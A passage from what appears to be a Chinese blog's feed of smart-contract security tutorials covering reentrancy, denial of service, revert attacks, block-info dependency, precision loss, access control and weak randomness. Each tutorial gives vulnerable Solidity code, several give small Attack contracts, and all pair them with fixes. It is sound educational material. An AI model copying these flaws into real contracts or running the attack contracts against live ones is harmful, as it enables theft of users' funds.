playerHashes[msg.sender] = _hash; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 猜数字</span><br><span class="line">    function guess(uint256 _guess, uint256 _salt) external &#123;</span><br><span class="line">        if (keccak256(abi.encodePacked(_guess, _salt, msg.sender)) == playerHashes[msg.sender] &amp;&amp; _guess == number)</span><br><span class="line">        &#123;</span><br><span class="line">            winner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
-<li>使用预提交方案（commit reveal scheme），如上案例；</li>
-<li>使用暗池，用户发出的交易将不进入公开待确认的交易池（也就是不对外广播，公开的网络中无法看到这个交易），而是直接到矿工手里。例如 flashbots 和 TaiChi；</li>
-<li>在调用参数中加上保护性参数，如滑点保护，从而减少抢跑者的潜在收益。</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>区块链安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>拒绝服务攻击</title>
-    <url>/2023/09/09/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>拒绝服务（DOS）攻击是一种常见的网络攻击手段，其目的是通过向目标服务器发送大量请求或占用其资源，使其无法正常处理合法用户的请求。在智能合约中，攻击者可以通过发送恶意交易或利用智能合约中的漏洞使得智能合约系统无法正常运行，从而导致服务拒绝或系统瘫痪，因此智能合约的设计和实现应该考虑到DOS攻击的威胁并采取相应的安全措施来保障系统的稳定性和可靠性。</p>
-<p>拒绝服务主要包含以下四大类：</p>
-<p><strong>非预期的外部调用</strong></p>
-<p>当合约对外部调用处理不当时可能导致拒绝服务。例如合约中存在基于外部函数执行的结果来改变合约状态且没有对交易一直失败的情况做出处理，攻击者会利用这个特点故意使交易失败，合约则会一直重复这笔失败的交易从而造成合约逻辑卡在这里不能继续执行，最后使得智能合约暂时或永久不可用。</p>
-<p><strong>Gas达到区块上限</strong></p>
-<p>当交易的gas开销达到区块上限时交易会失败，导致拒绝服务。例如合约中的映射或数组长度没有限制，导致循环遍历时消耗大量的 gas ，当 gas limit 高于可用的 max limit时，导致交易失败。</p>
-<p><strong>逻辑设计缺陷</strong></p>
-<p>当合约自身的逻辑实现存在缺陷时，攻击者可利用该缺陷导致合约不可用。例如当合约的某个功能没有考虑全面，而实际使用存在多种极端情况，合约中某个功能无法正常处理特殊的交易或陷入瘫痪，最后导致拒绝服务。</p>
-<p><strong>运营管理不当</strong></p>
-<p>当合约后期运营管理不当可能导致拒绝服务。例如 Owner 或 管理员权限过大，敏感操作失误或私钥丢失等可能会导致拒绝服务攻击，如 selfdestruct 函数被非预期执行。</p>
-<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>下面代码中是个DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用 deposit 退钱。<br>由于在调用 refund 取款的时候由于 Attack 合约中有 fallback、receive 中执行了 revert 回退，导致 DosGame.refund 的 call 检查转账结果返回 false 而导致合约无法正常提款。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract DosGame &#123;</span><br><span class="line">    bool public refundFinished;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    address[] public players;</span><br><span class="line"></span><br><span class="line">    // 所有玩家存ETH到合约里</span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        require(!refundFinished, &quot;Game Over&quot;);</span><br><span class="line">        require(msg.value &gt; 0, &quot;Please donate ETH&quot;);</span><br><span class="line">        // 记录存款</span><br><span class="line">        balanceOf[msg.sender] = msg.value;</span><br><span class="line">        // 记录玩家地址</span><br><span class="line">        players.push(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 游戏结束，退款开始，所有玩家将依次收到退款</span><br><span class="line">    function refund() external &#123;</span><br><span class="line">        require(!refundFinished, &quot;Game Over&quot;);</span><br><span class="line">        uint256 pLength = players.length;</span><br><span class="line">        // 通过循环给所有玩家退款</span><br><span class="line">        for(uint256 i; i &lt; pLength; i++)&#123;</span><br><span class="line">            address player = players[i];</span><br><span class="line">            uint256 refundETH = balanceOf[player];</span><br><span class="line">            (bool success, ) = player.call&#123;value: refundETH&#125;(&quot;&quot;);</span><br><span class="line">            require(success, &quot;Refund Fail!&quot;);</span><br><span class="line">            balanceOf[player] = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        refundFinished = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balance() external view returns(uint256)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    // 退款时进行DoS攻击</span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        revert(&quot;DoS Attack!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert(&quot;DoS Attack!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 参与DoS游戏并存款</span><br><span class="line">    function attack(address gameAddr) external payable &#123;</span><br><span class="line">        DosGame dos = DosGame(gameAddr);</span><br><span class="line">        dos.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
-<li>在进行外部调用时返回结果是否符合预期，不应完全依赖外部调用结果；</li>
-<li>在使用循环或外部调用或复杂操作时，应考虑 Gas 消耗；</li>
-<li>合约逻辑设计应充分考虑所有可能的情况，并进行适当的处理；</li>
-<li>避免对单个角色过度授权，处理合约权限是应做到合理的权限划分，对拥有权限的角色使用多签钱包管理，防止由于私钥泄露导致权限丢失。</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>Solidity</tag>
-        <tag>智能合约安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>回退攻击</title>
-    <url>/2023/09/30/%E5%9B%9E%E9%80%80%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>回退攻击是根据执行结果来决定的，如果操作结果没有达到攻击者预期的效果，攻击者会让交易回退。使用 require(), revert() 和 assert() 可以使不满足条件的调用失败，从而回退交易。</p>
-<p><strong>require(), revert() 和 assert()</strong><br>是Solidity 0.4.10及之后的版本中错误处理机制，下面3个语句等价：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition) &#123; revert(); &#125;</span><br><span class="line"></span><br><span class="line">assert(condition);</span><br><span class="line"></span><br><span class="line">require(condition);</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>1. require</strong></p>
-<ul>
-<li>通常用于执行前输入验证和状态检查，一般用于函数的开头处；</li>
-<li>退还剩余的 Gas；</li>
-</ul>
-<p><strong>2. revert</strong></p>
-<ul>
-<li>通常用于直接触发回退，可自定义异常处理，适用于更复杂逻辑的处理场景；</li>
-<li>退还剩余的 Gas；</li>
-</ul>
-<p><strong>3. aasert</strong></p>
-<ul>
-<li>通常用于预防不应该发生的情况，失败的断言可能意味着代码层存在错误；</li>
-<li>消耗所有剩余的 Gas，并回退所有的操作；</li>
-</ul>
-<p><strong>利用条件</strong></p>
-<ul>
-<li>随机性。合约中的执行结果具有随机性，想要达到预期的执行结果需要进行多次尝试，如果每次执行结果是一样的就没有必要进行回退。</li>
-<li>允许合约调用。攻击者可以在合约中定义攻击逻辑，如果执行结果非期望的结果则进行回退，直到得到期望的结果。如果是 EOA 账户，在交易执行中无法对结果进行判断，只能在交易完成后才能访问结果，此时交易已经完成，区块链状态已经更新则不能进行回退。</li>
-<li>有利可图。合约运行结果中，存在某个结果是有利可图的。</li>
-</ul>
-<h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p>以下代码是一个猜数字游戏，猜中数字即可获取 1 个ETH，猜错需要付出 0.1 个ETH，利用回退攻击，只要猜错就执行回退，因此可以通过消耗 gas 费来赢得奖励。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract GuessNum &#123;</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function _getRandom() internal view returns(uint256 random) &#123;</span><br><span class="line">        // 此处方便漏洞案例演示，采用伪随机数,请忽略随机数漏洞</span><br><span class="line">        random = uint256(keccak256(abi.encodePacked(block.coinbase, block.difficulty, block.timestamp))) % 10;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint256 num) public  payable  &#123;</span><br><span class="line">        uint256 rand = _getRandom();</span><br><span class="line">        if ( rand == num) &#123;</span><br><span class="line">            payable(msg.sender).transfer(1 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function rollBack(address gameAddr, uint256 num) external payable &#123;</span><br><span class="line">        uint256 beforeBalance = address(this).balance;</span><br><span class="line">        (bool success, ) = address(gameAddr).call&#123;value: 0.1 ether&#125;(abi.encodeWithSignature(&quot;guess(uint256)&quot;, num));</span><br><span class="line">        require(success, &quot;Failed to call.&quot;);</span><br><span class="line">        uint256 afterBalance = address(this).balance;</span><br><span class="line">        if (afterBalance &lt; beforeBalance) &#123;  // 通过余额来判断是否猜对，来决定是否进行回退。</span><br><span class="line">            revert(&quot;Failed to guessNum.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>只允许 EOA 账户进行调用 或 限制特定合约地址调用。</p>
-]]></content>
-      <tags>
-        <tag>Solidity</tag>
-        <tag>智能合约安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>区块链信息依赖漏洞</title>
-    <url>/2023/10/14/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%BF%A1%E6%81%AF%E4%BE%9D%E8%B5%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>由于合约可以访问区块信息（如区块编号block number，区块难度block difficulty 和区块时间戳 block timestamp等），合约的执行逻辑可能依赖区块信息。负责验证并打包区块的矿工可以在一定可控的范围内调整正在处理的区块信息。以时间戳为例，在合并（The Merge，从 PoW 升级到 PoS ）之前，以太坊矿工可以操纵区块时间，允许有900秒的偏移（<strong>注</strong>：在合并之后，以太坊改为固定 12s 一个区块，并且验证节点不能操纵区块时间。因此这类攻击不会在以太坊上发生，但仍可能在其他公链中存在）。因此，当矿工所处理的交易与自己的利益直接相关或有其他利益驱动时，此矿工便可以通过操纵区块信息来控制易受攻击的合约，以使合约的运行朝着有利于自己的方向运行。</p>
-<p>区块信息常常被开发者用于计算<strong>熵</strong>（随机性），而依赖此运行的合约就可能存在安全风险。</p>
-<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>例如基于时间戳依赖漏洞，当区块时间戳能被 101 整除时可以获取奖励，以太坊矿工可以通过控制区块时间从而获取奖励，代码如下：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract PlayGame &#123;</span><br><span class="line">    event Log(string);</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function _getRandom() private view returns(bool) &#123;</span><br><span class="line">        if(block.timestamp % 101 == 0) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint() public payable returns(bool randLucky) &#123;</span><br><span class="line">        randLucky = _getRandom();</span><br><span class="line">        if (randLucky == true) &#123;</span><br><span class="line">            require(payable(msg.sender).send(1 ether));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
-<li>减少合约逻辑对区块信息的依赖，以防被操控；</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>区块链安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>算术精度损失</title>
-    <url>/2024/01/21/%E7%AE%97%E6%9C%AF%E7%B2%BE%E5%BA%A6%E6%8D%9F%E5%A4%B1/</url>
-    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>由于 Solidity 不支持浮点运算，对于整数除法，小于除数的精度会被舍弃，从而导致精度损失。</p>
-<p>实际中，精度损失大致分为两种：</p>
-<ul>
-<li>四舍五入计算问题，在进行除法或减法运算时，计算顺序可能会导致精度损失；</li>
-<li>错误的向上或向下取整，可能导致本应为 0 的值取为 1 ，使得后续计算出现严重偏差。</li>
-</ul>
-<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>以下例子中，通过改变乘法和除法的计算顺序，导致计算结果不同。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract IntDivison &#123;</span><br><span class="line">    uint256 a = 100 ;</span><br><span class="line">    uint256 b = 15 ;</span><br><span class="line">    uint256 c = 30 ;</span><br><span class="line"></span><br><span class="line">    function test1() public view returns(uint256) &#123;</span><br><span class="line">        return a / b * c ;   // 计算结果为 180</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test2() public view returns(uint256) &#123;</span><br><span class="line">        return a * c / b ;   // 计算结果为 200</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>这里暂不考虑整数溢出的情况，溢出问题见整型溢出章节。</p>
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
-<li>调整运算的操作顺序，例如整数乘法优先于除法进行计算；</li>
-<li>增加整数的数量级，例如以太坊中使用最小单位 wei（1 ETH &#x3D; 1e18 wei）处理数学计算，</li>
-<li>设置合适的舍入规则，对于向上&#x2F;向下取整的情况，应考虑多种复杂的场景；</li>
-<li>使用安全有效的高精度计算库；</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>Solidity</tag>
-        <tag>智能合约安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>访问控制漏洞</title>
-    <url>/2023/09/02/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>合约没有正确的实现权限控制机制，导致未经授权的用户可以访问敏感函数或数据。例如，合约中的敏感函数没有适当的访问控制修饰符，使任何人都可以调用。访问控制漏洞主要分两个方面：</p>
-<p><strong>1. 代码层可见性</strong></p>
-<p>针对函数和变量，限制其所能修改和调用的作用域。</p>
-<ul>
-<li>public: 函数或状态变量可以从合约内部和外部进行访问；</li>
-<li>external: 只能被其它合约调用，不能在当前合约内部直接调用，不能用于修饰变量，只能修饰函数。外部函数通常用于提供合约的接口，可以从其它合约或外部交易调用。</li>
-<li>internal: 函数或状态变量可以在当前合约内部以及继承合约中进行访问。也是默认的函数和状态变量修饰符（Solidity高版本中编译器会为没有明确设置可见性的函数和状态变量显示告警）。</li>
-<li>private:  函数或状态变量仅能在当前合约内部访问，私有函数和状态变量对于外部地址是不可见的，只能在合约内的其它函数中使用。</li>
-</ul>
-<p><strong>2. 逻辑层权限约束</strong></p>
-<p>通常针对函数，限制某些特权用户访问。</p>
-<ul>
-<li>modifier:  常用于在函数执行前检查某种前置条件，封装为函数修改器，提升代码的复用性，可传参可被继承，还可以多个修改器同时使用。</li>
-</ul>
-<h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><p><strong>不受限制的敏感函数：</strong> 合约中函数如果包含了敏感操作，并且对外公开，会导致任何人都可以调用。如初始化操作，取款，销毁等</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function burn(address account, uint256 amount) public &#123;  // 任何人都可以调用</span><br><span class="line">  _burn(account, amount); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>角色过度授权：</strong> 如果角色权限实现逻辑存在缺陷，就可能存在过度授权的风险。例如，合约为管理员角色授予了太多权限，使其能够执行合约的关键功能。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function criticalFunction() public onlyAdmin &#123;</span><br><span class="line">  // 关键功能</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p>以下代码是修改合约所有者（owner），由于 changeOwner() 是 public 的，所以任何外部账户或合约都可以调用。因此，攻击者可以调用该函数改变合约的所有权并取得控制权。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract AuthTest &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _newOwner) public &#123; // 任何人都可以调用修改 owner</span><br><span class="line">        owner = _newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
-<li>合理使用可见性修饰符和 modifier 进行约束，遵循<strong>最小权限原则</strong>；</li>
-<li>设计合理的访问控制模型，且与代码实现逻辑一直；</li>
-<li>使用形式化验证检测访问控制漏洞。</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>Solidity</tag>
-        <tag>智能合约安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>重入攻击</title>
-    <url>/2023/08/19/%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>重入攻击（Reentrancy Attack）是一种常见的智能合约安全漏洞，当一个函数对另一个不受信任的合约进行外部调用时，就可能发生重入攻击。</p>
-<p>重入攻击的本质是合约内部调用的函数未能恰当地处理合约状态的更新，攻击者利用这个漏洞，将攻击代码插入到合约执行流程中，使得攻击者可以在合约还未完成之前再次调用某个函数(如: fallback, receive)，从而让攻击者在合约中获得额外的资产或信息。可以认为合约中所有的外部调用都是不安全的，都有可能存在重入漏洞。</p>
-<p>重入攻击类似编程里的递归调用，发生重入攻击的条件有2个：</p>
-<ul>
-<li>调用外部的合约且该合约是不安全的；</li>
-<li>外部合约的函数调用早于状态变量的更新；</li>
-</ul>
-<p>著名的重入攻击事件：<br>2016 年，The DAO 合约被重入攻击，黑客盗走了合约中的 3,600,000 枚 ETH，并导致以太坊分叉为 ETH 链和 ETC（以太经典）链。<br>2019 年，合成资产平台 Synthetix 遭受重入攻击，被盗 3,700,000 枚 sETH。<br>2020 年，借贷平台 Lendf.me 遭受重入攻击，被盗 $25,000,000。<br>2021 年，借贷平台 CREAM FINANCE 遭受重入攻击，被盗 $18,800,000。<br>2022 年，算法稳定币项目 Fei 遭受重入攻击，被盗 $80,000,000。</p>
-<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>先介绍几个概念</p>
-<p><strong>receive函数和fallback函数</strong></p>
-<p>Solidity支持两种特殊的回调函数，receive() 和 fallback() 。(在0.6版本之后 fallback() 函数拆分成 receive() 和 fallback() 两个函数)</p>
-<p>receive函数，不能有任何的参数，不能返回任何值，不需要function关键字，必须包含external和payable，一个合约最多只有一个receive()函数。</p>
-<ul>
-<li>原型：<code>receive() external payable &#123; ... &#125;</code>;</li>
-<li>功能：接收外部转账时需要实现此函数；</li>
-</ul>
-<p>fallback函数，不需要function关键字，必须由external修饰，payable修饰符是可选的，一个合约至多含有一个fallback()函数。</p>
-<ul>
-<li>原型：<code>fallback() external [payable] &#123; ... &#125;</code>;</li>
-<li>功能：调用合约不存在的函数时触发fallback函数执行；</li>
-</ul>
-<p><strong>转账函数</strong></p>
-<ol>
-<li><p>transfer</p>
-<ul>
-<li>函数原型：<code>&lt;address payable&gt;.transfer(uint256 amount)</code>;</li>
-<li>如果函数执行异常会转账失败，抛出异常（等价于require(send()）(合约地址转账)，会回滚交易（revert);</li>
-<li>有gas限制，最大2300（对方合约的fallback或receive函数不能实现太复杂的逻辑，否则gas不够）;</li>
-</ul>
-</li>
-<li><p>send</p>
-<ul>
-<li>函数原型：<code>&lt;address payable&gt;.send(uint256 amount) returns (bool)</code>;</li>
-<li>如果函数执行异常会转账失败，仅会返回false，不会终止执行（合约地址转账）;</li>
-<li>有gas限制，最大2300（对方合约的fallback或receive函数不能实现太复杂的逻辑，否则gas不够）;</li>
-</ul>
-</li>
-<li><p>call</p>
-<ul>
-<li>函数原型：<code>&lt;address&gt;.call(bytes memory) returns (bool, bytes memory)</code>；</li>
-<li>如果函数执行异常会转账失败，金辉返回false，不会终止执行（调用合约的方法并转账）；</li>
-<li>没有gas限制（支持对方合约的fallback、receive和其它函数实现复杂的逻辑）；</li>
-</ul>
-</li>
-</ol>
-<p><strong>代码示例</strong></p>
-<p>以下代码中 Bank 合约可以进行存款和取款，Attack 合约首先存入1个ETH，然后通过 Bank 合约的 withdraw 函数进行取款，Attack 合约收款时在 fallback() 或 receive() 函数中又重新调用了 Bank 合约的 withdraw() 函数，由于 Attack 的银行余额并没有及时更新，导致可以递归循环取走 Bank 合约中的所有ETH。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract Bank &#123;</span><br><span class="line">    mapping (address =&gt; uint256) public balanceOf;    // 余额mapping</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // 存入ether，并更新余额</span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        balanceOf[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 提取msg.sender的全部ether</span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        uint256 balance = balanceOf[msg.sender]; // 获取余额</span><br><span class="line">        require(balance &gt; 0, &quot;Insufficient balance&quot;);</span><br><span class="line">        // call进行转账，可能激活攻击合约的fallback/receive函数，存在重入风险</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Failed to send Ether&quot;);</span><br><span class="line">        // 更新余额</span><br><span class="line">        balanceOf[msg.sender] = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取银行合约的余额</span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    Bank public bank; // Bank合约地址</span><br><span class="line"></span><br><span class="line">    // 初始化Bank合约地址</span><br><span class="line">    constructor(Bank _bank) &#123;</span><br><span class="line">        bank = _bank;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (bank.getBalance() &gt;= 1 ether) &#123;</span><br><span class="line">            bank.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 攻击函数，调用时 msg.value 设为 1 ether</span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        require(msg.value == 1 ether, &quot;Require 1 Ether to attack&quot;);</span><br><span class="line">        bank.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">        bank.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取本合约的余额</span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p><strong>检查-效果-交互（checks-effect-interaction）</strong></p>
-<ul>
-<li>先检查状态是否满足条件。以Bank合约为例，即 <code>require(balance &gt; 0, &quot;Insufficient balance&quot;);</code></li>
-<li>再更新状态。以Bank合约为例，即 <code>balanceOf[msg.sender] = 0;</code></li>
-<li>最后再和其它合约进行交互。以Bank合约为例，即<code>(bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);</code></li>
-</ul>
-<p><strong>重入锁</strong></p>
-<p>重入锁是一种防止重入函数的修饰器（modifier）。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint8 private _status;</span><br><span class="line">modifier nonReentrant() &#123;</span><br><span class="line">    require(_status == 0, &quot;Reentrant call&quot;);</span><br><span class="line">    _status = 1;</span><br><span class="line"></span><br><span class="line">    _;</span><br><span class="line">    </span><br><span class="line">    _status = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
-      <tags>
-        <tag>Solidity</tag>
-        <tag>智能合约安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>随机数攻击</title>
-    <url>/2023/06/24/%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>随机数攻击，就是针对智能合约的随机数生成算法进行攻击，预测智能合约的随机数。</p>
-<p>常见的随机数获取有两种方式：使用区块变量生成随机数，使用预言机生成随机数。</p>
-<p><strong>区块链变量生成随机数</strong></p>
-<p>常见的区块链变量如下：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">block.basefee(uint)： 当前区块的基本费用</span><br><span class="line">block.chainid(uint)： 当前链id</span><br><span class="line">block.coinbase(address payable)： 当前区块矿工地址</span><br><span class="line">block.difficulty(uint)： 当前区块难度</span><br><span class="line">block.gaslimit(uint)： 当前区块gaslimit</span><br><span class="line">block.number(uint)： 当前区块号</span><br><span class="line">block.timestamp(uint)： 自Unix纪元以来的当前区块时间戳（以秒为单位）</span><br><span class="line">blockhash(uint blockNumber) returns (bytes32)： 给定区块的哈希，仅适用于256个最近的区块</span><br></pre></td></tr></table></figure></div>
-<p>由区块数据生成的随机数可能会限制普通用户预测随机数的可能性，但是并不能限制矿工作恶，矿工可以决定一个区块是否被广播，他们挖出了一个区块不是一定要广播出去也可以直接扔掉，这个就叫矿工的选择性打包。他们可以持续尝试生成随机数，直至得到想要的结果再广播出去。当然，旷工会这样做的前提是有足够的利益诱惑，例如可以获得一个很大的奖励池中的奖励，因此使用区块变量获取随机数的方法更适用于一些随机数不属于核心业务的应用。</p>
-<p><strong>预言机生成随机数</strong></p>
-<p>预言机是专门为生成随机数种子而搭建的链上或者链下的服务。除了使用第三方服务，也可以由 DApp 开发商自己搭建一个链下服务提供随机数，这种在链上获取链下数据的场景通常是通过链上预言机的方式来实现。</p>
